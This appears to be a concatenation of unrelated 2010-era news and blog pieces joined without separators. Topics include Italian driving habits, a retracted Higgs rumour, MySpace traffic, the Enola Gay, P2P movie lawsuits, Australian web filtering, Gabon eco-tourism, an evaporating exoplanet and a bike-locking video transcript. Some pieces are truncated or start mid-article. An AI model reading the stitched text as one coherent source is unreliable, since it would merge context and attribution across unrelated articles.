In relation to the first two commandments , the self - righteous “ I ’m going fast enough and they do n’t need to go any faster ” attitude prevalent in NorthAmerica is simply not acceptable in Italy .
If you are slower , for whatever reason , you remain alert to others , and allow them to pass without creating barriers to flow .
Always .
4 . Thou shalt know thy vehicle ’s capabilities and be able to control it in all situations .
Most American cars , and most foreign cars destined for U.S. soil , are designed with the understanding that they will likely not see many miles at speeds more than 75 mph , with the majority of those driven on lazy highways and suburban , squarely laid roads .
Cars for the European market , however , are conceived and constructed with appreciation for the fact that any car , from the cheapest Fiat 600 on through to a MB 600SL , may likely see its top speed tested on a daily basis , and has brakes and suspension systems tuned accordingly .
Case in point is the Opel Omega , sold in the United States as the Cadillac Catera , Saturn SL and Saab 9 - 5 , whose suspensions are quite softened for the U.S. market .
Another brilliant example of this is the Ford Focus , where the stock European - spec suspension , allows it to come alive , and its wonderful tuned chassis is finally challenged .
American highway engineers seem to take great pride in making any and every road they build or rebuild as straight as possible , removing those scary and dangerous curves .
In Europe , however , a great road is celebrated , and allowed to wind its way down a mountain or parallel God ’s own racecourse …
The river .
A side benefit of the prevalence of challenging roads is that for those who negotiate these roads daily , their level of driving competence is raised , whether consciously or not .
Urban traffic patterns demand a level of attention to timing and flow that can develop a unique skillset fro those who are willing to actively participate in becoming better drivers .
This requires us all to understand the breaking distances required by our respective vehicles , and the ability to accelerate smoothly and promptly to assure optimal flow for everyone .
This requires self - awareness AND focused attention to the road !
5 . Thou shalt keep thine eyes open at all times for other forms of transport .
Though this is fairly self - explanatory , cars are barely a majority on Italian roads , with bicycles , scooters , motorcycles , Apes ( three and four - wheeled mini- pickups ) , delivery trucks , semis , etc. ever - present in daily life .
It ’s essentially to factor in the flow of all these modes , and not simply presume that you can rigidly hold and occupy your full lane width regardless of what ’s going on around you .
This is especially important for Pedestrians on Multi-use paths , especially those who presume to walk 2 and 3 abreast of each other to demonstrate how oblivious they are to Others around them .
6 . Thou shalt keep thine eyes open for traffic obstructions , and share your views with others .
Whether it ’s tapping your brakes to warn others behind you , or flicking your highbeams to warn those ahead , the concept of shared roadways and safety is a constant act of collective vigilance .
7 . Thou shalt develop a firm one - handed driving style , in case the other hand is needed for bell / horn - ringing , or gesticulating to other drivers .
What can we say ?
Non-verbal communication is a lost art for most , and remains a highly effective means of personal expression , whether it ’s to demonstrate positive or negative feedback .
It ’s also about as Italian as it get ’s 😉
8 . Thou shalt regard speed limits , traffic signals and road signs as open to interpretation .
Popular Italian reasoning dictates that the further south you drive , the more lawless the driving style becomes , and that it would be naively dangerous to simply expect everyone to stay below the speed limit around you .
Extending this philosophy to all of Italy is that all stop signs indicate a yield .
Supposedly in the South , red lights are merely a suggestion .
With this approach in mind , you should always be ready to yield to faster traffic , and therefore become automatically more attentive around merging lanes , and safe in your conservative use of the faster outside lanes .
9 . Thou shalt appreciate grace and beauty in all it ’s forms .
Whether it ’s a demonstration of attentive headsup driving by a soccer - mom in a nicely detailed minivan , or the smooth flow of a fixed gear Cyclists threading through heavy traffic , there are all sorts of examples of aesthetic beauty , conscientious driving , and vehicular pride should be applauded and encouraged .
The open appreciation for the fine and attractive details of Life , create a sense of shared value that can only raise the general average for everyone !
10 .
Thou shalt appreciate thy vehicle as not just transportation , but as a statement of self , and therefore honor it , and maintain it to the utmost level as though it was part of your very Mortal Being …

The Large Hadron Collider is n't the only bad boy on the block looking for the so - called God particle -- technically known as the Higgs Boson .
A lesser known facility , the Tevatron -- located at the Fermi National Accelerator Laboratory in Batavia , Illinois -- has also been furiously searching for the particle which would help to explain the origins of mass in the universe -- and it looks like they might have found it .
A rumor has been swirling about recently that the found particle is a " three - sigma , " meaning that it 's got a 99.7 percent statistical likelihood of being correct -- but the lab itself has yet to confirm or deny .
The Tevatron , which was completed 27 years ago , is the second largest accelerator in the world ( after the LHC ) and it 's expected to be retired once the CERN facility is fully operational .
Well , that was fun for the few hours that it lasted .
New Scientist has published a piece confirming that Tevatron is in fact denying the rumor , and no Higgs Boson discovery has gone down .
MySpace has only half as many visitors as it had last year , says ComScore .
The net research firm revealed that in May 2010 , just 3.3 million web users visited the social network , compared to 6.5 million in May 2009 .
That 's a 49 percent drop .
MySpace was founded in 2003 and at its peak had 100 million members .
In 2005 , News Corp , which is headed by Rupert Murdoch , acquired MySpace for US $ 535 million ( £ 351 m ) .
However , the social network has struggled to keep pace with rival Facebook , which has soared in popularity since 2008 and subsequently overtaken MySpace .
This week , Facebook announced it had reached the 500 million members mark .
In the UK , the social network has 30.4 million users , which , according to ComScore , is 79 percent of the country 's web - using population .
Meanwhile , microblogging site Twitter has 4.3 million users in the UK , which is 62 percent up on last year .
ComScore also revealed that 90 percent of UK web users aged 15 and over used social - media sites in May 2010 .

This story , " As Facebook Soars , MySpace Loses Half its Traffic " was originally published by PC Advisor ( UK ) .
" Of all the World War II aircraft in the collection of the National Air and Space Museum , the most significant is the Enola Gay . "
So write curators Roger Connor and Christopher Moore in the new Smithsonian book In The Cockpit II : Inside History - Making Aircraft of World War II , published this month by Collins Design .
" On August 6 , 1945 , in the first combat use of the atomic bomb , this Army Air Forces Superfortress from the 509th Composite Group dropped the 13 - kiloton Little Boy on the Japanese city of Hiroshima , decimating it , " the authors continue .
" Even after the passage of six decades , its role in ending the war and the morality of the atomic bombings continue to be hotly debated .
However , there is no endeavor that better illustrates the unprecedented commitment and national investment in combating America 's totalitarian enemies than the pairing of the B - 29 and the Manhattan Project that developed the atomic bomb . "
A total of 34 aircraft are featured in this third compilation of cockpit photos by NASM photographers Eric Long and Mark Avino .
Here we focus on just one , the most famous B - 29 Superfortress of all .
About this image , Connor and Moore write : “ To drop the Little Boy atomic bomb , Maj .
Thomas Ferebee used a standard Norden M - 9B bombsight coupled to the pilots ’ C - 1 autopilot to lock in the aim point in central Hiroshima . ”
See the gallery below for more images of the Enola Gay , which are from the book unless otherwise noted .
1 of 6 History The U.S. Army Air Forces accepted the Enola Gay on June 14 , 1945 , as World War II was coming to an end .
After the war it flew in the Operation Crossroads atomic test program in the Pacific , then was delivered to Davis - Monthan Army Airfield , in Arizona , for storage .
The U.S. Air Force transferred it to the Smithsonian in 1949 .
On December 2 , 1953 , the aircraft made its final flight , landing at Andrews Air Force Base in Maryland .
The bomber remained in outdoor storage until 1961 , when Smithsonian staff , concerned about deterioration , disassembled it and moved it indoors to the Paul E. Garber Preservation , Restoration , and Storage facility .
The staff at Garber began restoring the Enola Gay in 1984 .
It was the largest restoration project the Museum had ever undertaken , and it was estimated that the project would take seven years .
The job actually took two decades — approximately 300,000 work hours — to complete .
The Superfortress is currently on display at the Museum ’s Steven F. Udvar - Hazy Center in northern Virginia .
In this 1945 image taken on the island of Tinian , officers salute each other in front of the Enola Gay as photographers and men look on .
The National Air and Space Museum has a detailed history of the aircraft here .

Houses • Cascais , Portugal Architects : Nuno de Sousa & Sonia Picolo
Year Completion year of this architecture project Year : 2009
Photographs Photographs : Ricardo Meireles
Text description provided by the architects .
The house is situated in a luxury residential area overlooking the golf course at Quinta da Marinha , Cascais , Portugal , subject to restrictions imposed by the local rules , by the orientation of the lot and the house program .
The challenge was to create , a solution that would allow the house to take the most of the golf course view and position itself to create an outdoor recreation area protected from wind .
The solution was the development of the house in two main volumes :
The ground floor with south / north orientation , bounded on the east side by a stone wall that separates the entrance area of all the remaining area .
Another volume on the upper floor , were the bedrooms are , with a perpendicular orientation .
At ground floor , stands a whole glass body , whose transparency allows visualization of the surroundings ( golf course ) , and for those outside facing the swimming pool will be shielded from the prevailing north wind .
The kitchen , living room , dining room and master bedroom are developed on the ground floor and access to garage , located on the lower floor will be facilitated by an elevator .
The privacy of the bedroom and main bathroom located and oriented to the south , was assured with the deployment of a wall and water surroundings .
All the flat roofs were made with a solution that creates a sealed " water box " , where it accumulates a continuous sheet of water that ensures harmonization of temperature variation between day and night and summer and winter .
This system also allows the use of rain water , forming a natural reserve of water for irrigation .
The introduction of an inner courtyard on the top floor provides interior of room ’s solar exposure on east and west sides , since the main glazing of these rooms is exposed to the view from the north side .
Another major challenge has been to establish a recreation area with indoor pool , jacuzzi , sauna and Turkish bath , being limited to the legal issues and aesthetics .
The solution adopted , established this area in the basement floor , but ripping the ground sloping to the north and west allowed the space to present a natural light and garden views .
By putting up the rooms facing north , the result of the south facade is not interesting and to change it , we specified mirrored glass , behind a fence of steel tubes arranged randomly .
This railing and mirrored glass also ensures the privacy of this space since the day reflection of the glass and confusion tubes inhibit visualization of what goes on inside the house .
At night , artificial lighting focusing on the exterior mirror glass , using LED lamps has the same effect .
The entire access to the main entrance door to the house is done with concrete slabs placed on top of the water .
Submerged spotlights placed under these slabs gives a very interesting effect at night .
DETROIT --
The Toronto Maple Leafs have signed former Detroit Red Wings defenseman Brett Lebda to a two - year contract worth $ 1.45 million per season .
Lebda was a regular on Detroit 's third pairing until Andreas Lilja returned to action following the Olympic break and seized the sixth spot on defense .
Lebda played sporadically afterward and appeared in only two playoff games .
Lebda played regularly for the Red Wings the previous three seasons .
He is undersized ( 5 - 9 , 195 ) but a good skater and could move the puck out of his zone quickly .
However , his performance declined steadily last season and he was prone to turnovers and mistakes .
He earned a surprisingly big raise from the Maple Leafs after making $ 850,000 last season .
Lebda , 28 , has appeared in 326 regular - season games , picking up 18 goals , 50 assists and 201 penalty minutes , all with Detroit .
The Red Wings signed him as an undrafted free agent out of Notre Dame in 2004 .
Let 's say it right up front : some large percentage of those targeted in the recent wave of P2P movie lawsuits are no doubt liable for their piratical behavior .
But those who " did n't do it " face an agonizing choice — pay $ 1,500 to $ 2,500 to settle the lawsuits brought by Dunlap , Grubb , & Weaver , or pay even more money for a lawyer to plead their innocence .
And innocent or not , a case that goes to court always runs the risk of ending in a $ 150,000 fine .
The sheer size of the penalties for online infringement would give anyone pause , and we 've heard recently from several of those currently wrestling with what to do .
All claim innocence , much like the woman we profiled two weeks back , and we cannot evaluate the truth of any particular claim .
But if you want to know just who these 14,000 P2P lawsuits have snared so far , here are several glimpses of how a lawsuit can affect a life .
" A good citizen should fight it "
Imagine that you 're on the receiving end of a settlement letter .
You 've never heard of the film mentioned .
You have only a hazy notion about BitTorrent .
How do you react ?
" It disrupted my work and life for several days , " said one father who contacted me after receiving a Far Cry settlement letter .
" I talked to many people about this and overwhelming reaction was that this is a scam .
Just a few said that maybe it will be less headache if I will pay $ 1,500 .
One said that a good citizen should fight it , not pay ...
" I asked everybody [ in my family ] , and everybody said ' I did not download it . '
I do not have little kids who will just get scared , hide in the closet , and deny everything .
Such conversations went on for a number of days .
We talked about risks and potential cost of the lawsuit , and if there is a slight chance that one of us shared that movie , it will be cheaper to pay the settlement . "
But he decided not to pay .
" After all these talks I can not just say , ' You are all liars , I do not trust you and I will just pay $ 1,500 . '
I decided that the trust in our family is more important than the money and headache of the lawsuit , I feel I am doing [ the ] right thing . "
He searched for files named " Far Cry " on his PC but found nothing .
But an Internet connection is tough to lock down completely — friends come over , relatives stay the night , a neighbor might leech WiFi .
" So I can not be 100 percent sure that there was no BitTorrent traffic from my IP , " he concluded .
" The best I can do is to trust what my family says : nobody ever downloaded this film .
Even if the file has ever passed through my router , nobody in my family knowingly gave command or authorization to do it , and this is the best I can tell . "
He then raised an unpleasant scenario : the prospect of " Internet insurance " that would pay out if a connection is used for anything illegal .
" I also realized that since I cannot fully control computers , and if I am legally responsible for all the traffic through my router , then I should cancel my home Internet access — it 's too risky .
Or since risk can be addressed by an insurance , I already see Internet liability insurance that covers such lawsuits . "
" Paycheck by paycheck "
Another reader e-mailed in frustration to say that he had until June 15 to settle for allegedly sharing the film Far Cry ( according to the settlement letter he received ) , but that he still did n't know what to do .
Settling would be a huge financial hardship , but hiring a lawyer to help fight the claim would likely cost more .
" Originally we got a letter from our ISP stating they have a subpoena for our name and address .
We literally had 2 business days to research and try to find legal counsel on this matter .
I called a local ISP lawyer here in [ state redacted ] .
His advice was to contact a lawyer over where this lawsuit originated ( Washington , DC ) .
Well , we do not have the monetary means or time to try and fight this ...
" I am disabled and along with my wife , we live with my parents .
My father is also disabled .
So there is only two incomes coming in for our family and as you know the standard of living in [ state redacted ] is bad enough .
We live paycheck by paycheck , so to speak . "
" A movie I never heard of "
A tech - savvy reader e-mailed in outrage over being subpoenaed in the Far Cry case .
" Here is a quick overview of my situation .
I received a subpoena notice from [ ISP redacted ] on May 4 , with a deadline of May 7 for response .
It included NO INFORMATION as to what the subpoena was about so I immediately tried to contact the sender of the notice .
After countless e-mails & phone calls , I finally reached an informed , live person by calling [ ISP 's ] corporate line ( which I found online and was NOT included in the notice ) .
" I was finally provided a copy of the subpoena itself and I recognized the date that I was accused of downloading Far Cry ( a movie I never heard of ) as a period when I was having Internet connection and wireless router issues .
I suspect my neighbors may have been using my connection without my permission and my ISP should have record of my support calls ...
" Unfortunately , I tried to hire an attorney that could help me with this and I was repeatedly told there was little I could do without further information from [ ISP ] , and certainly nothing I could do in the very short period before the subpoena deadline .
I did all this in the span of only a few days and STILL DIDN ’T GET ANYWHERE .
I assume my identity has been sent to the plaintiff and I can only imagine what others are going through trying to figure out what is going on here . "
" Way above our abilities to deal with "
Other readers took the situation into their own hands , writing letters to the DC District Court that look nothing like actual legal briefs .
But the federal judges overseeing the cases generally allow even the worst hand - scrawled into the record and rule on them as a " Motion to Quash " the subpoenas already issued .
Some of these personal notes , stripped as they are of the bloodless legal language of the courts , let people 's humanity show through .
On June 1 , for instance , the court accepted a letter written by one William Wright of Oregon .
Wright was objecting to the release of his information in the subpoena process , but in doing so sent a letter containing his name , his address , his e-mail address , his phone number , and his signature .
As the lawyers for Dunlap , Grubb , and Weaver would point out to the court a few days later , " Mr. Wright ’s motion actually divulges the very information sought by Plaintiff through the subpoena — his name and address as an alleged infringer , along with his IP address — thereby undermining any argument that this information is privileged .
Had Mr. Wright truly deemed this information to be privileged , he could have provided it to the court and requested it be sealed , and he would have redacted the information from the documents filed in the public record in this case .
However , Mr. Wright did not do that and basically has mooted his own motion to quash . "
One suspects that , despite the letter 's implication that this should have been obvious to anyone , Wright had no knowledge of court procedures , of sealing and redaction .
In any event , the two - paragraph note is touching but likely doomed to failure .
" My wife and I are both 69 years of age and the only occupants of this location , " wrote Wright .
" Charter personnel installed the high speed equipment for our internet connection and we have made no modifications to it .
If it had any features that made it vulnerable to ' hacking , ' we had no knowledge of that .
The technology is way above our abilities to deal with . "
But these are substantive issues of the facts in the case ; they are n't properly dealt with in a motion to quash , and the judge lacks any evidence upon which to assess such a claim .
As the plaintiff 's lawyers note , " The merits of the case , or Mr. Wright ’s defenses , are not at issue at this stage of the case . "
True enough , but letters like Wright 's are now sprinkled throughout the various P2P dockets in the DC District Court .
Through what they leave out , such letters make a single eloquent case : the authors do n't know the law , and they do n't have the resources to hire a lawyer to deal with some court case 3,000 miles away .
Another such letter insists that John Doe # 4 " has no knowledge of any such downloading of a copy of the film The Gray Man .
The Defendant , John
Doe also contends he does not have any understanding of the process of downloading this film and therefore is unaware of any ' torrent ' infringement as stated in the plaintiffs [ sic ] motion . "
And then there 's this , from yet another letter to the court : " At no time was my computer used to download neither [ sic ] the item in question nor any other unlawful download .
My computer IP address and MAC codes were not used for such actions and they do not match those provided .
Beyond this I do not have internet access through Charter . "
Judges to the rescue ?
Such motions have been routinely denied so far this year , but for those who feel " shaken down " by the process and believe in their own innocence , some ( free ) relief might in fact be coming soon .
Federal judges have n't been too keen to see P2P cases resolved this way .
Remember , only two cases in the RIAA legal campaign proceeded all the way to trial and verdict .
In the first , Judge Michael Davis has twice ruled in favor of the defendant after juries found her liable .
First , he granted her a complete retrial , and when that concluded , slashed the jury damage award from $ 1.92 million to $ 54,000 .
He noted the difference between what Jammie Thomas - Rasset did and the commercial infringement the statutory damage laws were written to stop .
" In the case of individuals who infringe by using peer ‐to‐peer networks , the potential gain from infringement is access to free music , not the possibility of hundreds of thousands — or even millions — of dollars in profits , " he wrote .
" The need for deterrence cannot justify a $ 2 million verdict for stealing and illegally distributing 24 songs for the sole purpose of obtaining free music . "
In the second case , that of Joel Tenenbaum in Massachusetts , Judge Nancy Gertner went even further in trashing the RIAA legal campaign .
" I 've said this before in open court , " she said .
" There is a huge imbalance in these cases .
The record companies are represented by large law firms with substantial resources .
The law is also overwhelmingly on their side .
They bring cases against individuals , individuals who do n't have lawyers and do n't have access to lawyers and who do n't understand their legal rights .
Some category of individuals are defaulted because they read the summons , and they have n't the foggiest idea what it means and do n't know where to go , so they 're defaulted , and they owe money anywhere from $ 3,000 to $ 10,000 as a result of these defaults ...
" I can't say this is a situation that is a good situation or a fair situation .
It is , however , the situation . "
In two of the cases brought by Dunlap , Grubb , & Weaver , Judge Rosemary Collyer has just given the lawyers two weeks to convince her that the lawsuit should n't be broken up into individual cases , with all but one defendant " dismissed for misjoinder . "
Federal judges , if they believe that the process has become abusive , may well intervene in the interests of fairness ; Gernter even helped Tenenbaum find free legal representation in Harvard Law professor Charles Nesson .
Note , though , that Davis and Gertner both allowed the cases to proceed and both oversaw " liable " verdicts .
Those who claim innocence need more than faith in the federal judiciary ; they need a backup plan should these cases proceed to trial .

Image caption Bobby Fischer died in Iceland at the age of 64
The remains of US - born chess champion Bobby Fischer have been exhumed in Iceland to establish a paternity claim .
Lawyers for nine - year old Jinky Young and her mother , Marilyn , who had a relationship with Fischer , claim she is entitled to Fischer 's fortune .
The Supreme Court in Reykjavik ruled last month a tissue sample was needed to prove she was Fischer 's daughter .
Fischer , who died in 2008 leaving an estate worth an estimated $ 2 m ( £ 1.4 m ) , took Icelandic citizenship in 2005 .
His former wife and other relatives have also pursued inheritance claims .
" The procedure was conducted in a highly professional and dignified manner , " Olafur Helgi Kjartansson , the sheriff in the southern Icelandic town of Selfoss , said .
Part 1 - the decisive battle was yesterday
You will have heard that the Australian Government has shelved it's
plans to introduce a mandatory " Great Firewall " , and that while an
Independent review proceeds certain ISPs will voluntarily block a
short list of undeniably vile child pornography URLs .
This is not good news .
I worked in the filtering industry for six years .
I was a senior
engineer at a company that sold network - level filters to schools
and businesses , one of the companies that whispered poison in Conroy 's ear
while the current government was in opposition , having failed to sell
the idea to then - minister Coonan .
I maintained my then - employer 's
copy of the Secret Blacklist , updating it weekly with the latest
additions ( almost never removals ) from ACMA .
The Biggest asset that anti-censorship campaigners have had is that
the ISPs in general did not want be censors .
They could n't be arsed
being the government 's stooge , it gets in the way of rampant profit .
The ISPs have maintained that filtering web traffic is in fact
technically impossible , and that any attempt to achieve it would
hopelessly degrade internet experience to third - world levels .
( The argument of impossibility has always been a little bit bullshit ,
since cheapskate ISPs are happy to deploy caching transparent proxies
to save money , and in reality a practical caching proxy is only a
tiny tweak away from a filter . )
As for the performance issue , its my experience from actually
writing code to filter web traffic that the further you put the
filter from the users , the slower and less effective it is .
Households that want a filtered feed should seek firewall or
local - loop provider solutions .
For the biggest top - tier ISPs in the country to suddenly announce they will
" Voluntarily " filter a list of child - abuse sites represents a massive
about - face on their part .
I can only wonder what sort of leverage the government
has exercised to force this concession .
I 'm dismayed by this " victory " on filtering because :
its an attempt to avoid having censorship debate during the election
paradoxically , after the election , whichever party wins can claim a
" mandate " to implement their version
" mandate " to implement their version if the ISPs can filter a list of hundreds of sites successfully , then the
infrastructure is already in place for them to be later compelled to filter
thousands
infrastructure is already in place for them to be later compelled to filter thousands worst , the users who will be " consulted " on whether the filtering has
an " acceptable impact " are going to be Telstra and Optus customers ( ! )
I 'm not
sure the undiscriminating dopes who put up with Big Telco service
would know a millisecond from a millipede .
I expect some grandma from Dubbo
whose Windows95 box and 33k6 modem are just as " snappy "
as ever will be " proof " that the filter " works fine " .
So do n't treat a " review " as anything but a sneak - attack , and do keep this issue hot during the election .
Next post I want to talk about my assessment of the arguments for and
against the filter , and after that examine the technical issues of
actually implementing it , and share some of my experiences from my years
in the filtering industry .

A Plea for Common Sense Why NATO Should Withdraw from Afghanistan
It is difficult for politicians to admit they were wrong .
But when it comes to Afghanistan , the consequences of not doing so could be high .
It is time for the West to cut its losses and withdraw .
Von Christoph Schwennicke
As an untouched West African paradise where hippos play in the Atlantic surf and buffaloes and elephants parade on the beach , little - visited Gabon had been marked out as a rising eco-tourism star .
But foreign visitors may have to leave Africa 's last Eden after the country 's largest tour operator said it was abandoning its business there following a simmering row with authorities in the oil - rich nation .
Africa 's Eden , the main operator in Gabon 's showpiece Loango National Park , said that an ongoing dispute with the country 's civil aviation authorities had forced it to pull out , closing the door on what it claims has been a € 15 m investment .
The acrimonious departure marks a sour end to initial efforts to rebrand the country as " Green Gabon " .
The former French colony has been trying to position itself as West Africa 's answer to Costa Rica since taking the decision to allocate more than one tenth of its land to national parks in 2002 .
Previously the sparsely populated equatorial country had been best known as a major oil producer , with President Omar Bongo – who ruled Gabon for 40 years until his death last year – connected with various alleged financial scandals involving French oil giant Elf .
" Gabon without France is like a car with no driver .
France without Gabon is like a car with no fuel , " he once said .
The former French air force lieutenant was regularly criticised for flouting human rights and amassing a huge fortune in an impoverished nation .
And the family 's spectacular wealth was recently the subject of an embarrassing corruption probe by a French magistrate .
However , Mr Bongo attracted rare international praise eight years ago with his decision to gazette 11 per cent of the country for preservation in 13 national parks .
With some 70 per cent of forest cover and little in the way of infrastructure , the strategy depended on attracting comparatively small numbers of high - end visitors who could be flown to newly created lodges and camps inside the parks .
Evidence of progress in putting Gabon on the map came when Loango National Park was named in 2008 by the British Guild of Travel Writers as " best new overseas destination " .
The income from tourism was then supposed to pay for the parks in a " cash for conservation " trade .
Gabon 's promotion as one of the world 's last true Edens – endorsed by several major conservation groups – was meant to be the beginning of an eco-tourism boom for the oil - dependent economies of West Africa .
Since taking over from his father , the country 's new President Ali Ben Bongo has restated his commitment to developing tourism and insisted he believes in " Green Gabon " .
Now the falling out with the country 's biggest tourism investor , Rombout Swanborn – the Dutch founder and CEO of Africa 's Eden –threatens to unravel this strategy .
Mr Swanborn , who spent part of his childhood in Gabon and made his fortune in the oil industry , said he would be taking legal action to claw back some of his firm 's losses on what had been billed as one of the world 's most exciting eco-ventures .
A spokesperson for the firm , Jacqueline van den Broek , said that Africa 's Eden had stopped marketing the destination and would be closing up its exclusive Loango Lodge – and laying off 125 employees – when the current batch of visitors leave before the end of August .
She said that government talk of creating an industry had been let down by a lack of real effort on the ground : " After 10 years we 're the only high end , professional operation in Gabon and we 're being pushed out . "
The final straw for the venture came after a year - long dispute with Gabon 's much - maligned civil aviation authority .
All Gabonese airlines have been blacklisted by the EU since 2008 after failing to meet 93 per cent of safety and operational requirements and the tour operator has its own in - house airline , SCD .
But the authorities have refused to renew the operating licences .
" We 've been pushed to this stage quite a number of times but our patience has run out , " said van den Broek .
Sebastiaan Verhage , who works in Gabon with the World Wildlife Fund ( WWF ) said the pull - out would be a blow for eco-tourism in the country but not necessarily a fatal one .
" Tourism is very important for Gabon and Africa 's Eden are very important for tourism , " he said by telephone from the capital , Libreville .
" They are the ones who got film stars and rich people to come here and made Gabon a bit more famous . "
But another five smaller operators are still in business , he added , and the southern sector of Loango park was still accessible even if the spectacular coastal area to the north was harder now to reach .
" This place is not going to become Costa Rica in the next few years .
There are no roads , no hotels , no infrastructure for that , " he said .
" A real tourism boom could take 20 years or more . "
Green Gabon ?
* Former President Omar Bongo designated a staggering 11 per cent of Gabon 's land mass a National Park – only Costa Rica has a higher proportion of the country given over to conservation .
* Established in September 2002 , Loango is the jewel in the crown of the 13 parks .
Situated between the Nkomi and Ndogo lagoons , forests , savannahs , wetlands and ocean all come together within its 380,000 acres .
With more than 60 miles of uninhabited shoreline , it is widely regarded as one of Africa 's last great coastal wildernesses .
* According to the Wildlife Conservation Society , up to 60,000 forest elephants inhabit the vast forests of Gabon .
In Loango they can be spotted wandering the white sand beaches during the rainy season , which lasts from October to April .
* Gabon 's beaches are home to the world 's largest population of leatherback turtles , with a recent study estimating there are 47,000 females alone .
* After South Africa , the world 's biggest concentration and variety ( at least 14 at the last count ) of whales and dolphins can be found off the Loango coast .
Humpback whales head to Gabonese waters during their winter breeding season from June to September .
* Other species to spot include red river hogs , slender - snouted crocodiles , western lowland gorillas , manatees and a huge array of birds .
* Loango is also home to the legendary " surfing hippos " .
These were memorably captured on film frolicking in the warm equatorial waters of the Atlantic Ocean by National Geographic photographer Michael Nichols .
" The hippos feed all night and then came back surfing up the coast to sleep in the lagoon all day so I had to be there very early , ready to take pictures as they arrived , " he explained .
" That meant setting up camp at least 45 minutes away so as not to disturb them .
I could n't even use a flashlight because they might have seen it . "
Nichols spent five months camping in the park with his family , as he documented the wildlife , much of which is unaccustomed to seeing humans because there are very few dwellings within the park .
" It was a bit like the Beverly Hillbillies going to live on the beach in Africa , " he said .
Scientists have discovered the first cometary planet , one with a huge tail , a stream of gas being ripped off by solar winds at 22,000 miles per hour .
This jovian world is located 153 light - years from Earth .

The planet — called HD 209458 b — orbits 100 times closer to its home star than our Jovian neighbor , traveling in an astonishingly fast 3.5 - day orbit .
For comparison , Mercury — our solar system fastest planet — has an 88 - day orbit .
Since HD 209458 b is so close to the sun , the stellar winds are ripping the planet 's atmosphere apart .
Scientists have used the Hubble 's Cosmic Origins Spectrograph to gather evidence that support the theory that its 2,000 ºF atmosphere is being ejected from its body at 22,000 miles per hour .

According to astronomer Jeffrey Linsky , of the University of Colorado in Boulder :
Since 2003 scientists have theorized the lost mass is being pushed back into a tail , and they have even calculated what it looks like .
We think we have the best observational evidence to support that theory .
We have measured gas coming off the planet at specific speeds , some coming toward Earth .
The most likely interpretation is that we have measured the velocity of material in a tail [...]
This large gas flow is likely gas swept up by the stellar wind to form the comet - like tail trailing the planet .
I do n't know about you , but I 'm happy that there are so many new things to watch and discover out there .

Since it 's officially the first week of Bike Month , we resurrected this 2003 bikeTV classic that was my first work to gain worldwide noterity in the alternative transportation world .
We hit the streets of Soho with the help of Bicycle Habitat 's most famous mechanic Hal Ruzal - who humorously grades the bike locking ability of New Yorkers .
Sure he 's harsh , but also damn funny while dispensing useful anecdotes from his many decades in the biz .
Hopefully you 'll learn how to keep your bike safe and avoid a failing grade .

Let me tell you why it fails .

</p><p>Hal : [ 0:16 ]
Hey I'm Hal , I 'm a mechanic for Bicycle Habitat .
People come in and give me sob stories how their wheels get stolen , their bikes get stolen , their seats get stolen .
Well most of the fault is these people because they do n't lock the bikes up right .
We 're going to take a little walk around here and critique the bikes that are locked outside in the streets of Manhattan .
</ p><p>[ 0:38 ]
Oh , this nice , secure Lemans 60 has a rear wheel that anyone can steal in a matter of 10 seconds with a 15 millimeter wrench or a vice grip .
Notice the rear wheel is not locked at all .
This is a D minus , [ buzzer ] because it 'll cost you $ 120 or so to get a back wheel for this bike and the bike is n't worth $ 120 .
</ p><p>[ 1:01 ]
Well , hopefully , these two people are eating in this restaurant but so far , this bike gets an F , you can steal both wheels in a matter of around eight seconds , both wheels , eight seconds the bike has no wheels will cost the person around $ 220 to replace these wheels .
In fact , you can steal the seat in one second .
This bike gets an F for locking .
[ buzzer ]
It fails locking .
</p><p>[ 1:31 ]
Contrary to popular belief , the quieter streets , the thief is more likely to get spooked .
If you take a busy street , the street noise and all the people walking around screen the thief and people wo n't care what he 's doing , whereas you get a quiet street like this , it 's too vacant for the thief to think about what 's going on so they do n't steal bikes on a quiet street like this .
</p><p>[ 2:00 ]
This is locked correctly , we really have an A here , let me tell you why it 's an A .
Seat is chained down , number one .
Number two , proper lock .
It 's a Kryptonite disc lock with a New York chain locked through the rear wheel and the frame to a secure pole .
There 's also an auxiliary cable clamping down the front wheel .
This bike is locked totally correctly , this bike gets an A .
</p>< p>[ musical interlude ]
</p><p>Hal : [ 2:35 ]
This is what happens when I give you an F .
Because when I give you an F , then the thief comes later and steals the back wheel .
You 've got to lock both wheels or else it becomes community property and you either have a bike that looks like this or you have to spend $ 120 to correct the fact that your bike is going to look like this .
</p><p>[ 2:55 ]
And this bike , has gotten an F. [ gong ]
</ p><p >[ 3:01 ]
This bike was a collector 's item at one time , now it 's collecting rust .
And also the stem is about to break in half but that 's another story .
</p><p>[ laughs ]
</ p><p>[ 3:09 ]
Good locking job in the rear .
Bad locking job in the front , but this front wheel is not that desirable .
So overall we give this a C .
</p><p>Speaker : [ 3:21 ] A C. </ p>< p>Speaker : [ 3:22 ] C.</p>< p>Speaker : [ laughter ] [ 3:22 ]
</ p>< p>Speaker : [ 3:24 ] A C? </ p><p>Hal : [ 3:24 ]
Yeah .
</p>< p>Speaker : [ 3:25 ]
Oh man .
</p><p>Hal : [ 3:25 ]
They 're going to steal your front wheel eventually .
</ p>< p>Speaker : [ 3:28 ]
The back wheel 's got like a thing on it .
</ p><p>Hal : [ 3:29 ]
I know .
I 'm rating them , this is a TV show .
</ p>< p>Speaker : [ 3:33 ]
I know , but it's at least worth like a B minus or something .
</ p><p>Hal : [ 3:37 ]
OK , I 'm going to make him , because the guy 's a cool guy , he gets a B minus on locking .
</ p>< p>Speaker : [ 3:41 ]
Thank you .
Thank you .
</ p><p>Hal : [ 3:42 ]
He gets a B minus .
[ gong ]
</p><p>[ 3:47 ]
He 's got tape over here so you can't steal the wheel , tape over here , they 're all locked together and the owner is watching , therefore you get an A on locking .
</p>< p>[ musical interlude ]
</p><p>Hal : [ 4:00 ]
Oh , this is sad .
This is dead . [ " Taps " ]
If I had some dirt and a shovel I would give it a proper burial .
Rigor mortis will be setting in .
[ " Taps " ]
</ p><p>[ 4:21 ]
What is with these people ?
They do n't lock the back wheels up at all .
The frame and front are locked up very well .
</ p>< p>Speaker : [ 4:27 ]
And that 's what they do .
</p><p>Hal : [ 4:27 ]
Proper lock , secure pole there , wrought iron , takes a while to saw through that , seat is locked , that 's good too , but the rear wheel makes it no good .
Where do most stolen bikes end up ?
They end up at various restaurants .
What happens is the junkie who steals bikes trades the bike to his fence for a bag of dope .
The fence calls up a local restaurant who he knows and says , " Hey I got a bike for you , $ 50 , " and all is good , except for the person who lost the bike .
